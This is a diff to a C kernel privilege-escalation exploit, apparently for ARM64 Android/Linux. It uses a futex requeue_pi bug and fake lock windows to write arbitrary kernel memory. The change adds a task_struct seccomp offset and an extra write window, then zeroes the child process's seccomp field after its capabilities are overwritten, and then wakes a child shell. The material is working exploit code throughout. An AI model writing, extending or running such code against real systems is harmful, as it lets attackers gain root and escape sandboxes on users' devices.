@@ -63,6 +63,7 @@ static double timer_ms(void) {
 #define OFF_TASK_STATE UINT64_C(0x593324)
 #define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x358d64)
 #define OFF_SEL_READ_ENFORCE UINT64_C(0x70ccec)
+#define OFF_TASK_SECCOMP UINT64_C(0x8d0)      /* offsetof(task_struct, seccomp) */
 #define ARM64_REG_COUNT 33
 #define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)
 
@@ -565,7 +566,8 @@ static int __attribute__((unused)) read_enforce(void) {
 static int write_value(uint64_t target, uint64_t value) {
   static const unsigned windows[] = {
   0xa80, 0xb00, 0xb80, 0xc00, 0xc80,
-  0xd00, 0xd80, 0xe00, 0xe80
+  0xd00, 0xd80, 0xe00, 0xe80,
+  0xf00,
 };
   if (fake_lock_index >= sizeof(windows) / sizeof(windows[0])) {
       pr_error("Out of fake lock windows! (Index %u)\n", fake_lock_index);
@@ -769,6 +771,12 @@ int main(int argc, char **argv) {
   if (!write_value(child_cred + 0x48, capval)) { pr_error("child cap_ambient write failed\n"); }
   record_stage('e');
   pr_success("Child cap_ambient=0x%016llx\n", (unsigned long long)capval);
+
+  if (!write_value(child_task + OFF_TASK_SECCOMP, 0)) {
+    pr_error("child seccomp clear failed\n");
+  }
+  record_stage('f');
+  pr_success("Child seccomp mode disabled (task+0x%x)\n", (unsigned)OFF_TASK_SECCOMP);
 
   TIMER("Exploit complete, waking child shell");
   __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
